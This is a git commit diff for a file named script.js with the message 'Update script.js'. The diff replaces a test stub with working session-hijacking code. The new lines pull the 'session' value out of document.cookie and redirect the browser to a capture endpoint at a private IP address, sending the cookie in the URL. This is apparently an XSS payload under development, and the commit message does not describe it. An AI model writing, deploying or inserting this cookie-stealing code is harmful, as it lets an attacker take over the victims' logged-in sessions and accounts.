98fb186a398d128251d07c1bac888ca8dd94e9b2
jondaveyan <jon.daveyan@gmail.com>
2024-04-17 14:24:00 +0400

    Update script.js

--- script.js
+++ script.js
@@ -1,7 +1,3 @@
-// File hosted on https://cdn.jsdelivr.net/your-external-script.js
-(function() {
-    var xhr = new XMLHttpRequest();
-    var token = 'test';
-    xhr.open('GET', 'http://192.168.0.102:8000/capture?token=test', true);
-    xhr.send();
-  })();
+var xhr = new XMLHttpRequest();
+var token = document.cookie.split(';').find(cookie => cookie.trim().startsWith('session=')).split('=')[1];
+window.location.href ='http://192.168.0.102:8000/capture?token='+encodeURIComponent(token);
